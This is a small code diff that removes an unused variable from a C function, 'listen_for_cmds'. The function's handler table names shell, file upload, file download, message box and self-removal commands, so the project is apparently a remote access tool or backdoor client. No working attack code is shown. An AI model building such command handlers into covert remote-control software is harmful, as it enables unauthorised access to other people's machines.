@@ -312,7 +312,6 @@ cleanup:
 
 void listen_for_cmds()
 {
-    int bytes_read = 0;
     struct cmd cmd = {};
     void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide, handle_upload_file, handle_download_file};
 
